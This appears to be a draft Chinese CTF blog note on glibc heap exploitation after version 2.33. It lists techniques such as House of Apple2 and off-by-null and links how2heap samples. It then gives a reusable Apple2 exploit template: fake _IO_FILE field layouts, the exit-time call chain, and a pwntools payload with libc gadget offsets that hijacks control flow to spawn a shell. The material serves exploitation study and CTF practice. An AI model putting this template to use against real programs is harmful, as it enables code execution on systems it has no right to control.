---
id: glibc-simple
aliases: []
tags:
  - Glibc
date: 2023-02-28 00:25:13
draft: true
title: GLIBC - exploitation-in-latest-glibc-0x00 基本思路
---

> [!TLDR] 
> **在选择更复杂的打法前，先看看能不能 IO leak 泄漏栈地址打 ROP（更容易调试）**

「卷 Glibc 版本」这件事情和常见的用户态 PWN 题（尤其是国内比赛）几乎完全绑定在了一起，故在此记录 2.33 失去 `__free_hook` 之后的常规题做法。主要包括：

- 有公式做题就是快之「只能申请大堆块 - Largebin Attack」
- 有公式做题就是快之「新版本下的控制流劫持首选 - [House of Apple2](https://bbs.kanxue.com/thread-273832.htm)」
- 典中典之「强网杯必考 off by null」

其实 IO 里面也远不只是 Apple2 这条利用链，但是这条链是要求最少 + 资料最多的，所有 IO 劫持控制流都绕不开篡改 `((struct _IO_FILE_plus *) _IO_list_all)->vtable`，利用思路差不多，就没必要去卷其它链。

> [!INFO] 
> 公式以外的情况多半时候都可以到持续更新的 [how2heap](https://github.com/shellphish/how2heap) 上找一些灵感，例如：
>
> - 在没有泄漏的情况下通过双重异或盲绕过 tcache 异或保护 - [safe link double protect](https://github.com/shellphish/how2heap/blob/master/glibc_2.36/safe_link_double_protect.c)
> - 在没有泄漏的情况下把 libc 相关地址放入 tcache 中 - [House of Water](https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_water.c)
> - 没有显示 free 时的现代版 House of Orange - [House of Tangerine](https://github.com/shellphish/how2heap/blob/master/glibc_2.39/house_of_tangerine.c)
> - 让 tcache double free 再次伟大 - [House of Botcake](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c)
>
> 各种花里胡哨的利用方法也在持续更新，可以一直关注 [how2heap](https://github.com/shellphish/how2heap)，甚至还提供了网页端调试器，非常好 cheatsheet❤️

## Largebin Attack


## Apple2 板子

> [!quote]
> 对 fp 的设置如下：
>
> - `_flags` 设置为 `~(2 | 0x8 | 0x800)`，如果不需要控制 rdi，设置为0即可；如果需要获得 shell，可设置为 `  sh;`，注意前面有两个空格
> - `vtable` 设置为 `_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap` 地址（加减偏移），使其能成功调用 `_IO_wfile_overflow` 即可
> - `_wide_data` 设置为可控堆地址 A，即满足 `*(fp + 0xa0) = A`
> - `_wide_data->_IO_write_base` 设置为 0，即满足 `*(A + 0x18) = 0`
> - `_wide_data->_IO_buf_base` 设置为 0，即满足 `*(A + 0x30) = 0`
> - `_wide_data->_wide_vtable` 设置为可控堆地址 B，即满足 `*(A + 0xe0) = B`
> - `_wide_data->_wide_vtable->doallocate` 设置为地址 C 用于劫持 RIP，即满足 `*(B + 0x68) = C`
> - **`_lock` 设置为可写地址；`mode` 设置大于 0**
>
> 函数的调用链如下：
>
> ```c
> _IO_wfile_overflow
>     _IO_wdoallocbuf
>         _IO_WDOALLOCATE
>             *(fp->_wide_data->_wide_vtable + 0x68)(fp)
> ```

对于常规的 exit 中有如下调用利用链：

```c
exit
    __run_exit_handlers
        _IO_cleanup
            _IO_flush_all_lockp
                _IO_wfile_overflow
```

板子如下：

```python
"""
1630aa:>  48 8b 6f 48          >  mov    rbp,QWORD PTR [rdi+0x48]
1630ae:>  48 8b 45 18          >  mov    rax,QWORD PTR [rbp+0x18]
1630b2:>  4c 8d 6d 10          >  lea    r13,[rbp+0x10]
1630b6:>  c7 45 10 00 00 00 00 >  mov    DWORD PTR [rbp+0x10],0x0
1630bd:>  4c 89 ef             >  mov    rdi,r13
1630c0:>  ff 50 28             >  call   QWORD PTR [rax+0x28]
"""
magic_gadget = libc_base + 0x1630AA
leave_ret = libc_base + 0x0000000000050877
add_rsp_0x38_ret = libc_base + 0x0000000000054BF4
pop_rdi_ret = libc_base + 0x0000000000023B65
pop_rsi_ret = libc_base + 0x00000000000251BE
pop_rdx_ret = libc_base + 0x0000000000166262
pop_rax_ret = libc_base + 0x000000000003FA43

_lock = libc_base + 0x1F8A10
_IO_wfile_jumps = libc_base + libc.sym._IO_wfile_jumps
fake_IO_FILE = heap_base + 0x290

f1 = IO_FILE_plus_struct()
f1.flags = u64_ex("  sh;")
f1._lock = _lock
f1._wide_data = fake_IO_FILE + 0xE0
f1._mode = 1
f1.vtable = _IO_wfile_jumps

f1._IO_save_base = fake_IO_FILE + 0x510 + 0x100

payload = flat(
    {
        0: {
            0: bytes(f1)[0x10:],
            0xE0 - 0x10: {
                0x18: [0],
                0x30: [0],
                0xE0: [fake_IO_FILE + 0x200],
            },
            # 0x200 - 0x10: {0x68: [0xDEADBEEF]},
            0x200 - 0x10: {0x68: [magic_gadget]},
        },
    }
)
edit(0, payload)
```



